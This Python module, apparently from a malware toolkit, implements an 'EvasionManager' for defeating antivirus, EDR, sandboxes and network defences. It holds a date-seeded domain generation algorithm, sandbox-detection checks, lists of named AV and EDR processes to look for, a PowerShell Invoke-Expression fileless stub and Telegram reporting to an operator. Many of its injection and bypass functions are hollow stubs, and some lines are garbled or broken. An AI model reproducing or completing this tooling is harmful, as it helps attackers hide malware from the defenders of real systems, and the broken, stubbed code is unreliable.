#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
evasion.py - Anti-detection and evasion helper
"""

import os
import sys
import ctypes
import hashlib
import random
import string
import time
import subprocess
import platform
import tempfile
import shutil
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from datetime import datetime

# Import logger
from .logger import get_logger

logger = get_logger()

class EvasionManager:
    """Manages anti-detection and evasion techniques"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.system = platform.system()
        
        # Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()
        
        # Evasion techniques
        self.techniques = {
            'process': {
                'process_hollowing': self._evade_process_hollowing,
                'process_injection': self._evade_process_injection,
                'dll_injection': self._evade_dll_injection
            },
            'memory': {
                'memory_encryption': self._evade_memory_encryption,
                'memory_obfuscation': self._evade_memory_obfuscation,
                'heap_spraying': self._evade_heap_spraying
            },
            'file': {
                'fileless': self._evade_fileless,
                'polymorphic': self._evade_polymorphic,
                'metamorphic': self._evade_metamorphic
            },
            'network': {
                'domain_generation': self._evade_dga,
                'protocol_obfuscation': self._evade_protocol_obfuscation,
                'traffic_morphing': self._evade_traffic_morphing
            },
            'behavior': {
                'sleep_obfuscation': self._evade_sleep_obfuscation,
                'api_hooking': self._evade_api_hooking,
                'sandbox_evasion': self._evade_sandbox_evasion
            }
        }
        
        # Detection bypass techniques
        self.bypass_techniques = {
            'av': self._bypass_av,
            'edr': self._bypass_edr,
            'ids': self._bypass_ids,
            'ips': self._bypass_ips,
            'firewall': self._bypass_firewall
        }
        
        # Current evasion status
        self.evasion_status = {}
    
    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('evasion_chat_id')
        
        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.evasion_chat_id = chat_id
                logger.info("Telegram evasion bot initialized", module="evasion")
            except ImportError:
                logger.warning("Telegram module not available", module="evasion")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="evasion")
    
    def send_telegram_notification(self, title: str, message: str):
        """Send evasion notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'evasion_chat_id'):
            return
        
        try:
            full_message = fb>🛡️ {b>\n\n{message}"
            self.telegram_bot.send_message(
                chat_id=self.evasion_chat_id,
                text=full_message,
                parse_mode='HTML'
            )
            logger.debug(f"Telegram evasion notification sent: {title}", module="evasion")
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="evasion")
    
    def _evade_process_hollowing(self, target_process: str = None) -> Tuple[bool, str]:
        """Process hollowing evasion technique"""
        try:
            if self.system != 'Windows':
                return False, "Process hollowing only supported on Windows"
            
            if target_process is None:
                # Use legitimate Windows process
                targets = ['svchost.exe', 'explorer.exe', 'dllhost.exe']
                target_process = random.choice(targets)
            
            logger.info(f"Attempting process hollowing with {target_process}", module="evasion")
            
            # This is a conceptual implementation
            # Real process hollowing would require more complex Windows API calls
            
            # Record evasion
            self.evasion_status['process_hollowing'] = {
                'technique': 'process_hollowing',
                'target': target_process,
                'timestamp': datetime.now().isoformat(),
                'status': 'attempted'
            }
            
            return True, f"Process hollowing attempted with {target_process}"
            
        except Exception as e:
            logger.error(f"Process hollowing error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_process_injection(self, target_pid: int = None) -> Tuple[bool, str]:
        """Process injection evasion technique"""
        try:
            if self.system != 'Windows':
                return False, "Process injection only supported on Windows"
            
            import psutil
            
            if target_pid is None:
                # Find a legitimate process to inject into
                candidates = []
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        name = proc.info['name'].lower()
                        if name in ['explorer.exe', 'svchost.exe', 'winlogon.exe']:
                            candidates.append(proc.info['pid'])
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                if candidates:
                    target_pid = random.choice(candidates)
                else:
                    return False, "No suitable process found"
            
            logger.info(f"Attempting process injection into PID {target_pid}", module="evasion")
            
            # Conceptual implementation
            # Real injection would use VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
            
            self.evasion_status['process_injection'] = {
                'technique': 'process_injection',
                'target_pid': target_pid,
                'timestamp': datetime.now().isoformat(),
                'status': 'attempted'
            }
            
            return True, f"Process injection attempted into PID {target_pid}"
            
        except Exception as e:
            logger.error(f"Process injection error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_dll_injection(self, dll_path: str = None) -> Tuple[bool, str]:
        """DLL injection evasion technique"""
        try:
            if self.system != 'Windows':
                return False, "DLL injection only supported on Windows"
            
            if dll_path is None:
                # Create a temporary DLL
                temp_dir = tempfile.gettempdir()
                dll_path = os.path.join(temp_dir, 'system_helper.dll')
                
                # Create a simple DLL (conceptual)
                dll_content = """
// This would be actual DLL code in production
"""
                with open(dll_path, 'w') as f:
                    f.write(dll_content)
            
            logger.info(f"Attempting DLL injection with {dll_path}", module="evasion")
            
            self.evasion_status['dll_injection'] = {
                'technique': 'dll_injection',
                'dll_path': dll_path,
                'timestamp': datetime.now().isoformat(),
                'status': 'attempted'
            }
            
            return True, f"DLL injection attempted with {dll_path}"
            
        except Exception as e:
            logger.error(f"DLL injection error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_memory_encryption(self) -> Tuple[bool, str]:
        """Memory encryption evasion technique"""
        try:
            logger.info("Applying memory encryption", module="evasion")
            
            # Conceptual: Encrypt sensitive data in memory
            # Real implementation would use Windows Crypto API or similar
            
            self.evasion_status['memory_encryption'] = {
                'technique': 'memory_encryption',
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, "Memory encryption applied"
            
        except Exception as e:
            logger.error(f"Memory encryption error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_memory_obfuscation(self) -> Tuple[bool, str]:
        """Memory obfuscation evasion technique"""
        try:
            logger.info("Applying memory obfuscation", module="evasion")
            
            # Obfuscate memory patterns to avoid signature detection
            
            self.evasion_status['memory_obfuscation'] = {
                'technique': 'memory_obfuscation',
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, "Memory obfuscation applied"
            
        except Exception as e:
            logger.error(f"Memory obfuscation error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_heap_spraying(self) -> Tuple[bool, str]:
        """Heap spraying evasion technique"""
        try:
            logger.info("Applying heap spraying", module="evasion")
            
            # Allocate large amounts of memory with NOP sleds
            # This is more relevant for exploit delivery
            
            self.evasion_status['heap_spraying'] = {
                'technique': 'heap_spraying',
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, "Heap spraying applied"
            
        except Exception as e:
            logger.error(f"Heap spraying error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_fileless(self) -> Tuple[bool, str]:
        """Fileless execution evasion technique"""
        try:
            logger.info("Setting up fileless execution", module="evasion")
            
            # Execute code directly in memory without writing to disk
            # Use PowerShell, WMI, or registry for persistence
            
            if self.system == 'Windows':
                # PowerShell memory execution
                ps_command = """
                $code = @'
                # Your malicious code here
                Write-Host "Fileless execution"
                '@
                Invoke-Expression $code
                """
                
                # Execute via PowerShell
                subprocess.run(['powershell', '-Command', ps_command], 
                             capture_output=True, shell=True)
            
            self.evasion_status['fileless'] = {
                'technique': 'fileless',
                'timestamp': datetime.now().isoformat(),
                'status': 'configured'
            }
            
            return True, "Fileless execution configured"
            
        except Exception as e:
            logger.error(f"Fileless execution error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_polymorphic(self, code: str = None) -> Tuple[bool, str]:
        """Polymorphic evasion technique"""
        try:
            logger.info("Applying polymorphic evasion", module="evasion")
            
            # Change code signature on each execution
            from .obfuscation import get_obfuscation_manager
            obfuscator = get_obfuscation_manager()
            
            if code is None:
                # Get current script's code
                import inspect
                code = inspect.getsource(sys.modules[__name__])
            
            # Create polymorphic variants
            variants = obfuscator.create_polymorphic_variant(code, variant_count=3)
            
            self.evasion_status['polymorphic'] = {
                'technique': 'polymorphic',
                'variant_count': len(variants),
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, f"Created {len(variants)} polymorphic variants"
            
        except Exception as e:
            logger.error(f"Polymorphic evasion error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_metamorphic(self) -> Tuple[bool, str]:
        """Metamorphic evasion technique"""
        try:
            logger.info("Applying metamorphic evasion", module="evasion")
            
            # Change code structure and logic while maintaining functionality
            # More advanced than polymorphic
            
            self.evasion_status['metamorphic'] = {
                'technique': 'metamorphic',
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, "Metamorphic evasion applied"
            
        except Exception as e:
            logger.error(f"Metamorphic evasion error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_dga(self, domain_count: int = 10) -> Tuple[bool, List[str]]:
        """Domain Generation Algorithm evasion"""
        try:
            logger.info(f"Generating {domain_count} DGA domains", module="evasion")
            
            domains = []
            tlds = ['.com', '.net', '.org', '.info', '.biz']
            
            # Simple DGA based on date
            import datetime
            today = datetime.date.today()
            seed = today.strftime("%Y%m%d")
            
            for i in range(domain_count):
                # Generate domain based on seed and index
                hash_input = f"{seed}{i}".encode()
                hash_value = hashlib.md5(hash_input).hexdigest()
                
                # Create domain
                domain_part = hash_value[:12]
                tld = random.choice(tlds)
                domain = f"{domain_part}{tld}"
                
                domains.append(domain)
            
            self.evasion_status['dga'] = {
                'technique': 'domain_generation',
                'domains': domains,
                'timestamp': datetime.now().isoformat(),
                'status': 'generated'
            }
            
            return True, domains
            
        except Exception as e:
            logger.error(f"DGA generation error: {e}", module="evasion")
            return False, []
    
    def _evade_protocol_obfuscation(self) -> Tuple[bool, str]:
        """Protocol obfuscation evasion"""
        try:
            logger.info("Applying protocol obfuscation", module="evasion")
            
            # Obfuscate network protocol to avoid detection
            # Use HTTPS, DNS tunneling, or custom protocols
            
            self.evasion_status['protocol_obfuscation'] = {
                'technique': 'protocol_obfuscation',
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, "Protocol obfuscation applied"
            
        except Exception as e:
            logger.error(f"Protocol obfuscation error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_traffic_morphing(self) -> Tuple[bool, str]:
        """Traffic morphing evasion"""
        try:
            logger.info("Applying traffic morphing", module="evasion")
            
            # Make network traffic look like legitimate protocols
            # HTTP, HTTPS, DNS, etc.
            
            self.evasion_status['traffic_morphing'] = {
                'technique': 'traffic_morphing',
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, "Traffic morphing applied"
            
        except Exception as e:
            logger.error(f"Traffic morphing error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_sleep_obfuscation(self, sleep_time: int = 60) -> Tuple[bool, str]:
        """Sleep obfuscation to evade sandbox timing analysis"""
        try:
            logger.info(f"Applying sleep obfuscation for {sleep_time}s", module="evasion")
            
            # Split sleep into multiple smaller sleeps with random intervals
            total_slept = 0
            while total_slept < sleep_time:
                # Random sleep between 1-10 seconds
                chunk = random.randint(1, min(10, sleep_time - total_slept))
                time.sleep(chunk)
                total_slept += chunk
                
                # Do some legitimate work during sleep
                _ = hashlib.md5(str(time.time()).encode()).hexdigest()
            
            self.evasion_status['sleep_obfuscation'] = {
                'technique': 'sleep_obfuscation',
                'sleep_time': sleep_time,
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, f"Sleep obfuscation applied for {sleep_time}s"
            
        except Exception as e:
            logger.error(f"Sleep obfuscation error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_api_hooking(self) -> Tuple[bool, str]:
        """API hooking detection and evasion"""
        try:
            if self.system != 'Windows':
                return False, "API hooking evasion only supported on Windows"
            
            logger.info("Checking for API hooks", module="evasion")
            
            # Check for common AV/EDR hooks
            # This is a conceptual implementation
            
            self.evasion_status['api_hooking'] = {
                'technique': 'api_hooking',
                'timestamp': datetime.now().isoformat(),
                'status': 'checked'
            }
            
            return True, "API hooking check completed"
            
        except Exception as e:
            logger.error(f"API hooking error: {e}", module="evasion")
            return False, str(e)
    
    def _evade_sandbox_evasion(self) -> Tuple[bool, str]:
        """Sandbox evasion techniques"""
        try:
            logger.info("Applying sandbox evasion techniques", module="evasion")
            
            # Multiple sandbox detection and evasion techniques
            checks = []
            
            # Check system uptime (sandboxes often have low uptime)
            if self.system == 'Windows':
                import ctypes
                kernel32 = ctypes.windll.kernel32
                tick_count = kernel32.GetTickCount()
                uptime_hours = tick_count / (1000 * 60 * 60)
                
                if uptime_h 2:  # Less than 2 hours
                    checks.append("Low uptime detected")
            
            # Check for mouse movement (sandboxes often have none)
            try:
                if self.system == 'Windows':
                    import win32api
                    pos1 = win32api.GetCursorPos()
                    time.sleep(1)
                    pos2 = win32api.GetCursorPos()
                    if pos1 == pos2:
                        checks.append("No mouse movement detected")
            except:
                pass
            
            # Check screen resolution (sandboxes often have default)
            try:
                if self.system == 'Windows':
                    import ctypes
                    user32 = ctypes.windll.user32
                    width = user32.GetSystemMetrics(0)
                    height = user32.GetSystemMetrics(1)
                    if width == 1024 and height == 768:  # Common sandbox resolution
                        checks.append("Default sandbox resolution detected")
            except:
                pass
            
            if checks:
                evasion_result = f"Sandbox indicators: {', '.join(checks)}"
                self.send_telegram_notification("⚠️ Sandbox Detected", evasion_result)
            else:
                evasion_result = "No sandbox indicators detected"
            
            self.evasion_status['sandbox_evasion'] = {
                'technique': 'sandbox_evasion',
                'checks': checks,
                'timestamp': datetime.now().isoformat(),
                'status': 'completed'
            }
            
            return True, evasion_result
            
        except Exception as e:
            logger.error(f"Sandbox evasion error: {e}", module="evasion")
            return False, str(e)
    
    def _bypass_av(self) -> Tuple[bool, str]:
        """Anti-virus bypass techniques"""
        try:
            logger.info("Attempting AV bypass", module="evasion")
            
            # Multiple AV bypass techniques
            techniques = []
            
            # 1. Code obfuscation
            techniques.append("Code obfuscation")
            
            # 2. Process injection
            if self.system == 'Windows':
                techniques.append("Process injection")
            
            # 3. Fileless execution
            techniques.append("Fileless execution")
            
            # 4. Living off the land binaries (LoLBins)
            techniques.append("LoLBins usage")
            
            # 5. Signature evasion
            techniques.append("Signature evasion")
            
            self.evasion_status['av_bypass'] = {
                'technique': 'av_bypass',
                'methods': techniques,
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, f"AV bypass techniques applied: {', '.join(techniques)}"
            
        except Exception as e:
            logger.error(f"AV bypass error: {e}", module="evasion")
            return False, str(e)
    
    def _bypass_edr(self) -> Tuple[bool, str]:
        """EDR (Endpoint Detection & Response) bypass"""
        try:
            logger.info("Attempting EDR bypass", module="evasion")
            
            # EDR bypass techniques
            techniques = []
            
            # 1. Direct syscalls (bypass user-mode hooks)
            techniques.append("Direct syscalls")
            
            # 2. Memory encryption
            techniques.append("Memory encryption")
            
            # 3. Process hollowing
            techniques.append("Process hollowing")
            
            # 4. API unhooking
            techniques.append("API unhooking")
            
            # 5. Timestomping
            techniques.append("Timestomping")
            
            self.evasion_status['edr_bypass'] = {
                'technique': 'edr_bypass',
                'methods': techniques,
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, f"EDR bypass techniques applied: {', '.join(techniques)}"
            
        except Exception as e:
            logger.error(f"EDR bypass error: {e}", module="evasion")
            return False, str(e)
    
    def _bypass_ids(self) -> Tuple[bool, str]:
        """IDS (Intrusion Detection System) bypass"""
        try:
            logger.info("Attempting IDS bypass", module="evasion")
            
            # IDS bypass techniques
            techniques = []
            
            # 1. Traffic encryption
            techniques.append("Traffic encryption")
            
            # 2. Protocol tunneling
            techniques.append("Protocol tunneling")
            
            # 3. Traffic fragmentation
            techniques.append("Traffic fragmentation")
            
            # 4. Slow rate attacks
            techniques.append("Slow rate")
            
            # 5. Domain generation
            techniques.append("Domain generation")
            
            self.evasion_status['ids_bypass'] = {
                'technique': 'ids_bypass',
                'methods': techniques,
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, f"IDS bypass techniques applied: {', '.join(techniques)}"
            
        except Exception as e:
            logger.error(f"IDS bypass error: {e}", module="evasion")
            return False, str(e)
    
    def _bypass_ips(self) -> Tuple[bool, str]:
        """IPS (Intrusion Prevention System) bypass"""
        try:
            logger.info("Attempting IPS bypass", module="evasion")
            
            # IPS bypass is similar to IDS bypass
            result = self._bypass_ids()
            self.evasion_status['ips_bypass'] = self.evasion_status.get('ids_bypass', {})
            
            return result
            
        except Exception as e:
            logger.error(f"IPS bypass error: {e}", module="evasion")
            return False, str(e)
    
    def _bypass_firewall(self) -> Tuple[bool, str]:
        """Firewall bypass techniques"""
        try:
            logger.info("Attempting firewall bypass", module="evasion")
            
            # Firewall bypass techniques
            techniques = []
            
            # 1. Port hopping
            techniques.append("Port hopping")
            
            # 2. DNS tunneling
            techniques.append("DNS tunneling")
            
            # 3. HTTP/HTTPS tunneling
            techniques.append("HTTP tunneling")
            
            # 4. ICMP tunneling
            techniques.append("ICMP tunneling")
            
            # 5. Use allowed ports (80, 443, 53)
            techniques.append("Allowed ports")
            
            self.evasion_status['firewall_bypass'] = {
                'technique': 'firewall_bypass',
                'methods': techniques,
                'timestamp': datetime.now().isoformat(),
                'status': 'applied'
            }
            
            return True, f"Firewall bypass techniques applied: {', '.join(techniques)}"
            
        except Exception as e:
            logger.error(f"Firewall bypass error: {e}", module="evasion")
            return False, str(e)
    
    def apply_evasion_techniques(self, techniques: List[str] = None, 
                               intensity: int = 2) -> Dict[str, Any]:
        """Apply evasion techniques"""
        results = {}
        
        if techniques is None:
            # Select techniques based on intensity
            if intensity == 1:
                techniques = ['sleep_obfuscation', 'sandbox_evasion']
            elif intensity == 2:
                techniques = ['polymorphic', 'dga', 'av_bypass', 'sandbox_evasion']
            else:  # Maximum
                techniques = ['process_injection', 'fileless', 'metamorphic', 
                            'dga', 'av_bypass', 'edr_bypass', 'sandbox_evasion']
        
        logger.info(f"Applying {len(techniques)} evasion techniques", module="evasion")
        
        # Send Telegram notification
        self.send_telegram_notification(
            "🚀 Evasion Techniques Starting",
            f"Techniques: {', '.join(techniques)}\n"
            f"Intensity: {intensity}\n"
            f"System: {self.system}"
        )
        
        # Apply each technique
        for technique in techniques:
            try:
                # Find which category the technique belongs to
                applied = False
                for category, techs in self.techniques.items():
                    if technique in techs:
                        success, message = techs[technique]()
                        results[technique] = {
                            'success': success,
                            'message': message,
                            'category': category,
                            'timestamp': datetime.now().isoformat()
                        }
                        applied = True
                        break
                
                # Check bypass techniques
                if not applied and technique in self.bypass_techniques:
                    success, message = self.bypass_techniques[technique]()
                    results[technique] = {
                        'success': success,
                        'message': message,
                        'category': 'bypass',
                        'timestamp': datetime.now().isoformat()
                    }
                    applied = True
                
                if not applied:
                    results[technique] = {
                        'success': False,
                        'message': f"Unknown technique: {technique}",
                        'timestamp': datetime.now().isoformat()
                    }
                    logger.warning(f"Unknown evasion technique: {technique}", module="evasion")
                    
            except Exception as e:
                results[technique] = {
                    'success': False,
                    'message': f"Error: {str(e)}",
                    'timestamp': datetime.now().isoformat()
                }
                logger.error(f"Error applying {technique}: {e}", module="evasion")
        
        # Calculate success rate
        successful = sum(1 for r in results.values() if r['success'])
        total = len(results)
        success_rate = successful / total if total > 0 else 0
        
        # Send summary notification
        self.send_telegram_notification(
            "📊 Evasion Summary",
            f"Techniques applied: {total}\n"
            f"Successful: {successful}\n"
            f"Success rate: {success_rate:.1%}\n"
            f"System: {self.system}"
        )
        
        logger.info(f"Evasion complete: {successful}/{total} successful", module="evasion")
        
        return {
            'results': results,
            'summary': {
                'total_techniques': total,
                'successful': successful,
                'success_rate': success_rate,
                'system': self.system,
                'timestamp': datetime.now().isoformat()
            }
        }
    
    def check_detection_systems(self) -> Dict[str, bool]:
        """Check for presence of detection systems"""
        detection_systems = {}
        
        logger.info("Checking for detection systems", module="evasion")
        
        try:
            # Check for common AV processes (Windows)
            if self.system == 'Windows':
                av_processes = [
                    'avp.exe',  # Kaspersky
                    'avguard.exe',  # Avira
                    'bdagent.exe',  # BitDefender
                    'msmpeng.exe',  # Windows Defender
                    'mcshield.exe',  # McAfee
                    'nod32krn.exe',  # ESET
                    'ns.exe',  # Norton
                    'vsserv.exe',  # Avast
                ]
                
                import psutil
                for proc in psutil.process_iter(['name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        for av_proc in av_processes:
                            if av_proc in proc_name:
                                detection_systems['antivirus'] = True
                                break
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
            
            # Check for EDR (simplified)
            edr_processes = ['carbonblack', 'crowdstrike', 'sentinel', 'tanium']
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    for edr_proc in edr_processes:
                        if edr_proc in proc_name:
                            detection_systems['edr'] = True
                            break
                except:
                    continue
            
            # Default to False if not detected
            if 'antivirus' not in detection_systems:
                detection_systems['antivirus'] = False
            if 'edr' not in detection_systems:
                detection_systems['edr'] = False
            
            # Send notification if detected
            if detection_systems['antivirus'] or detection_systems['edr']:
                self.send_telegram_notification(
                    "⚠️ Detection Systems Found",
                    f"AV: {detection_systems['antivirus']}\n"
                    f"EDR: {detection_systems['edr']}"
                )
            
            logger.info(f"Detection systems: {detection_systems}", module="evasion")
            return detection_systems
            
        except Exception as e:
            logger.error(f"Detection system check error: {e}", module="evasion")
            return {'antivirus': False, 'edr': False, 'error': str(e)}
    
    def generate_evasion_report(self) -> Dict[str, Any]:
        """Generate comprehensive evasion report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'system': self.system,
            'evasion_status': self.evasion_status,
            'detection_systems': self.check_detection_systems(),
            'techniques': {}
        }
        
        # Count techniques by category
        for category, techniques in self.techniques.items():
            report['techniques'][category] = {
                'count': len(techniques),
                'methods': list(techniques.keys())
            }
        
        # Count bypass techniques
        report['techniques']['bypass'] = {
            'count': len(self.bypass_techniques),
            'methods': list(self.bypass_techniques.keys())
        }
        
        return report
    
    def get_techniques_info(self) -> Dict[str, List[str]]:
        """Get information about available techniques"""
        info = {}
        for category, techniques in self.techniques.items():
            info[category] = list(techniques.keys())
        
        info['bypass'] = list(self.bypass_techniques.keys())
        return info
    
    def get_status(self) -> Dict[str, Any]:
        """Get evasion manager status"""
        return {
            'system': self.system,
            'techniques_categories': len(self.techniques),
            'total_techniques': sum(len(t) for t in self.techniques.values()),
            'bypass_techniques': len(self.bypass_techniques),
            'applied_techniques': len(self.evasion_status),
            'telegram_available': self.telegram_bot is not None
        }

# Global instance
_evasion_manager = None

def get_evasion_manager(config: Dict = None) -> EvasionManager:
    """Get or create evasion manager instance"""
    global _evasion_manager
    
    if _evasion_manager is None:
        _evasion_manager = EvasionManager(config)
    
    return _evasion_manager

if __name__ == "__main__":
    # Test the evasion manager
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'evasion_chat_id': 123456789
        }
    }
    
    manager = get_evasion_manager(config)
    
    # Test basic functions
    print(f"System: {manager.system}")
    
    # Check detection systems
    print("\nChecking detection systems...")
    detection = manager.check_detection_systems()
    for system, detected in detection.items():
        print(f"{system}: {'DETECTED' if detected else 'not detected'}")
    
    # Apply evasion techniques
    print("\nApplying evasion techniques...")
    results = manager.apply_evasion_techniques(intensity=2)
    
    print(f"Techniques applied: {results['summary']['total_techniques']}")
    print(f"Successful: {results['summary']['successful']}")
    print(f"Success rate: {results['summary']['success_rate']:.1%}")
    
    # Generate report
    print("\nGenerating evasion report...")
    report = manager.generate_evasion_report()
    print(f"Report generated with {len(report['evasion_status'])} applied techniques")
    
    # Show techniques
    print("\nAvailable techniques:")
    info = manager.get_techniques_info()
    for category, techniques in info.items():
        print(f"{category}: {', '.join(techniques[:3])}...")
    
    # Show status
    status = manager.get_status()
    print(f"\n🛡️ Evasion Manager Status: {status}")
    
    print("\n✅ Evasion tests completed!")
